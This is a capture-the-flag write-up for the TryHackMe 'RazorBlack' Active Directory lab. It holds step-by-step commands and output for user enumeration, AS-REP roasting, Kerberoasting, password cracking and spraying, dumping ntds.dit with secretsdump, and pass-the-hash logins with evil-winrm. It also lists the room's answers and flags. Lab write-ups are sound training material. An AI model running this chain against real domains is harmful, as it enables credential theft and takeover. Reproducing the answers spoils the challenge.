<h1 align="center">RazorBlack</h1>

<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/a6500fcb-b647-4a47-9b11-d3dea717f3de5"><br>
June 12, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure,<br>
part of my <code>402</code>-day-streak in<a href="https://tryhackme.com">TryHackMe</a>.<br>
These guys call themselves hackers. Can you show them who's the boss ? Click <a href="https://tryhackme.com/room/raz0rblackd"</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/bb67dd74-6cb8-4fe8-b5d3-90b0f05e73be"></p>


<h2>Task 1 . Deploy the Machine</h2>
<p>Throw something like a rock on the big green thingy on the right side here to deploy your box. .... [ Start Machine ]<br><br>

The box has ICMP enabled. So, look at ping first before starting recon and stop slapping `-Pn` on nmap.<br><br>

This room is proudly made by: Xyan1d3<br><br>

Every solver of this box will get a free cookie when completing this box.<br><br>

If you enjoy this room, please let me know by tagging me on Twitter. You may also contact me in case of some unintended routes or bugs, and I will be happy to resolve them. Also, let me know which part you enjoyed and which part made you struggle.</p>

<h3 align="left"> Answer the question below</h3>

> 1.1. <em>Deploy the machine and check for ping before starting recon</em><br><a id='1.1'></a>
>> <strong><code>No answer needed</code></strong><br>
<p></p>

<br>

<h3>ping</h3>

```bash
:~# ping 10.10.61.39
PING 10.10.61.39 (10.10.61.39) 56(84) bytes of data.
64 bytes from 10.10.61.39: icmp_seq=1 ttl=128 time=52.7 ms
64 bytes from 10.10.61.39: icmp_seq=2 ttl=128 time=12.0 ms
64 bytes from 10.10.61.39: icmp_seq=3 ttl=128 time=51.9 ms
64 bytes from 10.10.61.39: icmp_seq=4 ttl=128 time=11.0 ms
64 bytes from 10.10.61.39: icmp_seq=5 ttl=128 time=49.5 ms
^C
--- 10.10.61.39 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4004ms
rtt min/avg/max/mdev = 11.032/35.441/52.747/19.561 ms
```


<h3>nmap</h3>
<p><code>vulnnet-rst.local0</code></p>

```bash
:~# nmap 10.10.61.39
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
111/tcp  open  rpcbind
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
2049/tcp open  nfs
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
...
```

```bash
:~# nmap -sC -sV 10.10.61.39
...
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-12 01:40:29Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  mountd        1-3 (RPC #100005)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RAZ0RBLACK
|   NetBIOS_Domain_Name: RAZ0RBLACK
|   NetBIOS_Computer_Name: HAVEN-DC
|   DNS_Domain_Name: raz0rblack.thm
|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2025-06-12T01:42:45+00:00
| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm
| Not valid before: 2025-06-11T01:31:43
|_Not valid after:  2025-12-11T01:31:43
|_ssl-date: 2025-06-12T01:43:00+00:00; -1s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
...
Host script results:
|_nbstat: NetBIOS name: HAVEN-DC, NetBIOS user: <unknown>, NetBIOS MAC: 02:52:ce:e6:c7:27 (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-12T01:42:45
|_  start_date: N/A
...
```

<h3>/etc/hosts</h3>

```bash
10.10.61.39     HAVEN-DC.raz0rblack.thm HAVEN-DC raz0rblack.thm
```

<h2>Task 2 . Flag Submission Panel</h2>
<p>This will test your Active Directory enumeration and exploitation knowledge.<br><br>

Submit your flags and answers to prove your progression.</p>

<h3 align="left"> Answer the question below</h3>

> 2.1. <em>What is the Domain Name?</em><br><a id='2.1'></a>
>> <strong><code>raz0rblack.thm</code></strong><br>
<p></p>


> 2.2. <em>What is Steven's Flag?</em><br><a id='2.2'></a>
>> <strong><code>THM{ab53e05c9a98def00314a14ccbfa8104}</code></strong><br>
<p></p>

<h3>showmount</h3>

```bash
:~# showmount -e 10.10.61.39
Export list for 10.10.61.39:
/users (everyone)
...
root@ip-10-10-106-156:~/mnt# mkdir users
root@ip-10-10-106-156:~/mnt# cd ..
...
:~# sudo mount -t nfs 10.10.61.39:/users ./mnt/users
...
:~/mnt/users# ls
employee_status.xlsx  sbradley.txt
:~/mnt/users# cat sbradley.txt
\ufffd\ufffdTHM{ab53e05c9a98def00314a14ccbfa8104}
```

<h3>LibreOfficeCalc --> employee_status.xlsx</h3>

![image](https://github.com/user-attachments/assets/f43af393-1f93-4100-bb3d-4b89765cf795)

<h3>kerbrute</h3>

```bash
:~# kerbrute userenum /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.61.39 --domain raz0rblack.thm

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/12/25 - Ronnie Flathers @ropnop

2025/06/12 02:45:50 >  Using KDC(s):
2025/06/12 02:45:50 >  	10.10.61.39:88

2025/06/12 02:45:52 >  [+] VALID USERNAME:	 administrator@raz0rblack.thm
2025/06/12 02:46:04 >  [+] VALID USERNAME:	 Administrator@raz0rblack.thm
2025/06/12 02:46:48 >  [+] VALID USERNAME:	 twilliams@raz0rblack.thm
2025/06/12 02:47:15 >  [+] VALID USERNAME:	 sbradley@raz0rblack.thm
```

<h3>KerBrute, usernames.txt</h3>

<p><code>steven bradley</code> = <code>sbradley@raz0rblack.thm</code> = <code>sbradley</code><br>
...</p>

```bash
:~# kerbrute userenum /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.61.39 --domain raz0rblack.thm

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/12/25 - Ronnie Flathers @ropnop

2025/06/12 02:45:50 >  Using KDC(s):
2025/06/12 02:45:50 >  	10.10.61.39:88

2025/06/12 02:45:52 >  [+] VALID USERNAME:	 administrator@raz0rblack.thm
2025/06/12 02:46:04 >  [+] VALID USERNAME:	 Administrator@raz0rblack.thm
2025/06/12 02:46:48 >  [+] VALID USERNAME:	 twilliams@raz0rblack.thm
2025/06/12 02:47:15 >  [+] VALID USERNAME:	 sbradley@raz0rblack.thm
```

```bash
~# cat usernames.txt
dport
iroyce
tvidal
aedwards
cingram
ncassidy
rzaydan
lvetrova
rdelgado
twilliams
sbradley
clin
```

```bash
:~# python3.9 /opt/impacket/build/scripts-3.9/GetNPUsers.py raz0rblack.thm/ -dc-ip 10.10.61.39 -usersfile usernames.txt -no-pass -request -outputfile kerberos-users-discovered
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User lvetrova doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User sbradley doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

```bash
~# cat kerberos-users-discovered
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:7fe5e380e5077ec2931dced443fee223$135b6b2d52e781faad6c35fe535e75eb4e8b4bf8969f7f022eb6be48e8dc89998ccdb5823684fc77d19bf0ee007eab3cb11c6413cc60354174e267e9858b79689547a0b08d07ee5adc12ae10213d9cf8510476633af0db3ddf26bc33eb4fb745d2a750e5a3dca5d9acb530771462c3514c3c8f708714d9175ca77ee80e3001ef2a2b0792ccf0909a72a4fdb8382621b3734b84dfcfd1c023034d46a966f1fa8f9b46cdb599179047a0dbc52f54f8ecb2ccccc9350cca936b04eea370ff47eee305e2773ed8418afe0cabf2aeb13d554c0f362e0789acc9a3b6d559b20308acde9c6930e1904e3cc6183f5fc03a10e423
:~# john --wordlist=/usr/share/wordlists/rockyou.txt kerberos-users-discovered
Warning: detected hash type "krb5asrep", but the string is also recognized as "krb5asrep-aes-opencl"
Use the "--format=krb5asrep-aes-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
roastpotatoes    ($krb5asrep$23$twilliams@RAZ0RBLACK.THM)
1g 0:00:00:12 DONE (2025-06-12 03:21) 0.08298g/s 350369p/s 350369c/s 350369C/s rob3556..roasteddog
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```bash
:~# kerbrute passwordspray --dc 10.10.0.101 -d raz0rblack.thm usernames.txt roastpotatoes

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/12/25 - Ronnie Flathers @ropnop

2025/06/12 04:08:10 >  Using KDC(s):
2025/06/12 04:08:10 >  	10.10.0.101:88

2025/06/12 04:08:10 >  [+] VALID LOGIN:	 sbradley@raz0rblack.thm:roastpotatoes
2025/06/12 04:08:10 >  [+] VALID LOGIN:	 twilliams@raz0rblack.thm:roastpotatoes
2025/06/12 04:08:10 >  Done! Tested 12 logins (2 successes) in 0.050 seconds
root@ip-10-10-6-32:~# 
```

```bash
:~# python3.9 /opt/impacket/build/scripts-3.9/smbpasswd.py sbradley@10.10.0.101
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Current SMB password: 
New SMB password: 
Retype new SMB password: 
[!] Password is expired, trying to bind with a null session.
[*] Password was changed successfully.
```

```bash
:~# crackmapexec smb 10.10.0.101 -u sbradley -p password123
SMB         10.10.0.101     445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
SMB         10.10.0.101     445    HAVEN-DC         [+] raz0rblack.thm\sbradley:password123
```

```bash
:~# crackmapexec smb 10.10.0.101 -u sbradley -p password123 --shares
SMB         10.10.0.101     445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
SMB         10.10.0.101     445    HAVEN-DC         [+] raz0rblack.thm\sbradley:password123 
SMB         10.10.0.101     445    HAVEN-DC         [*] Enumerated shares
SMB         10.10.0.101     445    HAVEN-DC         Share           Permissions     Remark
SMB         10.10.0.101     445    HAVEN-DC         -----           -----------     ------
SMB         10.10.0.101     445    HAVEN-DC         ADMIN$                          Remote Admin
SMB         10.10.0.101     445    HAVEN-DC         C$                              Default share
SMB         10.10.0.101     445    HAVEN-DC         IPC$            READ            Remote IPC
SMB         10.10.0.101     445    HAVEN-DC         NETLOGON        READ            Logon server share 
SMB         10.10.0.101     445    HAVEN-DC         SYSVOL          READ            Logon server share 
SMB         10.10.0.101     445    HAVEN-DC         trash           READ            Files Pending for deletion
```

```bash
:~# crackmapexec smb 10.10.0.101 -u twilliams -p roastpotatoes --shares
SMB         10.10.0.101     445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
SMB         10.10.0.101     445    HAVEN-DC         [+] raz0rblack.thm\twilliams:roastpotatoes 
SMB         10.10.0.101     445    HAVEN-DC         [*] Enumerated shares
SMB         10.10.0.101     445    HAVEN-DC         Share           Permissions     Remark
SMB         10.10.0.101     445    HAVEN-DC         -----           -----------     ------
SMB         10.10.0.101     445    HAVEN-DC         ADMIN$                          Remote Admin
SMB         10.10.0.101     445    HAVEN-DC         C$                              Default share
SMB         10.10.0.101     445    HAVEN-DC         IPC$            READ            Remote IPC
SMB         10.10.0.101     445    HAVEN-DC         NETLOGON        READ            Logon server share 
SMB         10.10.0.101     445    HAVEN-DC         SYSVOL          READ            Logon server share 
SMB         10.10.0.101     445    HAVEN-DC         trash                           Files Pending for deletion
```

```bash
```


```bash
:~# smbclient //10.10.0.101/trash --user=sbradley%password123
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Mar 16 06:01:28 2021
  ..                                  D        0  Tue Mar 16 06:01:28 2021
  chat_log_20210222143423.txt         A     1340  Thu Feb 25 19:29:05 2021
  experiment_gone_wrong.zip           A 18927164  Tue Mar 16 06:02:20 2021
  sbradley.txt                        A       37  Sat Feb 27 19:24:21 2021

		5101823 blocks of size 4096. 1021372 blocks available
smb: \> get chat_log_20210222143423.txt
getting file \chat_log_20210222143423.txt of size 1340 as chat_log_20210222143423.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> get experiment_gone_wrong.zip
getting file \experiment_gone_wrong.zip of size 18927164 as experiment_gone_wrong.zip (20378.8 KiloBytes/sec) (average 3440.3 KiloBytes/sec)
smb: \> get sbradley.txt
getting file \sbradley.txt of size 37 as sbradley.txt (0.4 KiloBytes/sec) (average 3388.0 KiloBytes/sec)
smb: \> quit
```

```bash
:~# cat chat_log_20210222143423.txt
sbradley> Hey Administrator our machine has the newly disclosed vulnerability for Windows Server 2019.
Administrator> What vulnerability??
sbradley> That new CVE-2020-1472 which is called ZeroLogon has released a new PoC.
Administrator> I have given you the last warning. If you exploit this on this Domain Controller as you did previously on our old Ubuntu server with dirtycow, I swear I will kill your WinRM-Access.
sbradley> Hey you won't believe what I am seeing.
Administrator> Now, don't say that you ran the exploit.
sbradley> Yeah, The exploit works great it needs nothing like credentials. Just give it IP and domain name and it resets the Administrator pass to an empty hash.
sbradley> I also used some tools to extract ntds. dit and SYSTEM.hive and transferred it into my box. I love running secretsdump.py on those files and dumped the hash.
Administrator> I am feeling like a new cron has been issued in my body named heart attack which will be executed within the next minute.
Administrator> But, Before I die I will kill your WinRM access..........
sbradley> I have made an encrypted zip containing the ntds.dit and the SYSTEM.hive and uploaded the zip inside the trash share.
sbradley> Hey Administrator are you there ...
sbradley> Administrator .....

The administrator died after this incident.

Press F to pay respects
```

<br>

> 2.3. <em>What is the zip file's password?</em><br><a id='2.3'></a>
>> <strong><code>electromagnetismo</code></strong><br>
<p></p>

```bash
:~# zip2john experiment_gone_wrong.zip > Hash
ver 2.0 efh 5455 efh 7875 experiment_gone_wrong.zip/system.hive PKZIP Encr: 2b chk, TS_chk, cmplen=2941739, decmplen=16281600, crc=BDCCA7E2 type=8
ver 2.0 efh 5455 efh 7875 experiment_gone_wrong.zip/ntds.dit PKZIP Encr: 2b chk, TS_chk, cmplen=15985077, decmplen=58720256, crc=68037E87 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

```bash
:~# john --wordlist=/usr/share/wordlists/rockyou.txt Hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
electromagnetismo (experiment_gone_wrong.zip)
1g 0:00:00:06 DONE (2025-06-12 04:21) 0.1483g/s 1242Kp/s 1242Kc/s 1242KC/s elephantman31..eldon1986
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
:~# 
```

```bash
:~# unzip experiment_gone_wrong.zip
Archive:  experiment_gone_wrong.zip
[experiment_gone_wrong.zip] system.hive password: 
  inflating: system.hive             
  inflating: ntds.dit     
```

```bash
:~# python3.9 /opt/impacket/build/scripts-3.9/secretsdump.py -system system.hive -ntds ntds.dit LOCAL | tee hash_dump.txt
:~# cat hash_dump.txt | cut -d ':' -f 4 | tee form_hashes.txt
:~# head form_hashes.txt
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra


nthash)
[*] Searching for pekList, be patient

[*] Reading and decrypting hashes from ntds.dit 
1afedc472d0fdfe07cd075d36804efd0
31d6cfe0d16ae931b73c59d7e0c089c0
4ea59b8f64c94ec66ddcfc4e6e5899f9
```

```bash
~# evil-winrm -i 10.10.0.101 -u lvetrova -H f220d3988deb3f516c73f40ee16c431d
...
*Evil-WinRM* PS C:\Users\lvetrova> dir


    Directory: C:\Users\lvetrova


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        2/25/2021  10:14 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
-a----        2/25/2021  10:16 AM           1692 lvetrova.xml


*Evil-WinRM* PS C:\Users\lvetrova> $Credential = Import-Clixml -Path ".\lvetrova.xml"
*Evil-WinRM* PS C:\Users\lvetrova> $Credential.GetNetworkCredential().password
THM{694362e877adef0d85a92e6d17551fe4}
*Evil-WinRM* PS C:\Users\lvetrova> exit
```

<br>
<br>

```bash
:~# evil-winrm -i 10.10.0.101 -u xyan1d3 -p cyanide9amine5628
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> whoami
raz0rblack\xyan1d3
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> dir
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> cd ..
*Evil-WinRM* PS C:\Users\xyan1d3> dir


    Directory: C:\Users\xyan1d3


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        2/25/2021   9:34 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
-a----        2/25/2021   9:33 AM           1826 xyan1d3.xml


*Evil-WinRM* PS C:\Users\xyan1d3> $Credential = Import-Clixml -Path ".\xyan1d3.xml"
*Evil-WinRM* PS C:\Users\xyan1d3> $Credential.GetNetworkCredential().password
LOL here it is -> THM{62ca7e0b901aa8f0b233cade0839b5bb}
*Evil-WinRM* PS C:\Users\xyan1d3> 
```

<br>
<br>


```bash
:~# evil-winrm -i 10.10.175.39 -u administrator -H 9689931bed40ca5a2ce1218210177f0c
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        5/21/2021   9:45 AM                3D Objects
d-r---        5/21/2021   9:45 AM                Contacts
d-r---        5/21/2021   9:45 AM                Desktop
d-r---        5/21/2021   9:45 AM                Documents
d-r---        5/21/2021   9:45 AM                Downloads
d-r---        5/21/2021   9:45 AM                Favorites
d-r---        5/21/2021   9:45 AM                Links
d-r---        5/21/2021   9:45 AM                Music
d-r---        5/21/2021   9:45 AM                Pictures
d-r---        5/21/2021   9:45 AM                Saved Games
d-r---        5/21/2021   9:45 AM                Searches
d-r---        5/21/2021   9:45 AM                Videos
-a----        2/25/2021   1:08 PM            290 cookie.json
-a----        2/25/2021   1:12 PM           2512 root.xml


PS C:\Users\Administrator> type root.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Administrator</S>
      <SS N="Password">44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a</SS>
  </Obj>
</Objs>
```

```bash
:~# python3
Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> s = "44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a"
>>> print(bytes.fromhex(s).decode('ASCII'))
Damn you are a genius.
But, I apologize for cheating you like this.

Here is your Root Flag
THM{1b4f46cc4fba46348273d18dc91da20d}

Tag me on https://twitter.com/Xyan1d3 about what part you enjoyed on this box and what part you struggled with.

If you enjoyed this box you may also take a look at the linuxagency room in tryhackme.
Which contains some linux fundamentals and privilege escalation https://tryhackme.com/room/linuxagency.

>>>
```

```bash
*Evil-WinRM* PS C:\Users> cd twilliams
*Evil-WinRM* PS C:\Users\twilliams> dir


    Directory: C:\Users\twilliams


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        2/25/2021  10:18 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
-a----        2/25/2021  10:20 AM             80 definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_de
                                                 finitely_definitely_not_a_flag.exe


*Evil-WinRM* PS C:\Users\twilliams> type definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
THM{5144f2c4107b7cab04916724e3749fb0}
*Evil-WinRM* PS C:\Users\twilliams> 
```

> 2.10. <em>What is the complete top secret?</em><br><a id='2.10'></a>
>> <strong><code>:wq</code></strong><br>
<p></p>

```bash
PS C:\Program Files> cd "Top Secret"
*Evil-WinRM* PS C:\Program Files\Top Secret> dir


    Directory: C:\Program Files\Top Secret


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/25/2021  10:13 AM         449195 top_secret.png


*Evil-WinRM* PS C:\Program Files\Top Secret> download top_secret.png
                                        
Info: Downloading C:\Program Files\Top Secret\top_secret.png to top_secret.png
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Program Files\Top Secret> 
```

![image](https://github.com/user-attachments/assets/f5756f1a-da86-47e5-a90a-0f64b28e2bfa)


<br>

> 2.6. <em>What is Xyan1d3's password?</em><br><a id='2.6'></a>
>> <strong><code>cyanide9amine5628</code></strong><br>
<p></p>


```bash
:~# python3.9 /opt/impacket/build/scripts-3.9/GetUserSPNs.py raz0rblack.thm/twilliams:roastpotatoes -dc-ip 10.10.61.39 -request -output hash
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation 
-------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm  2021-02-23 15:17:17.715160  <never>               



[-] CCache file is not found. Skipping...
:~# cat hash
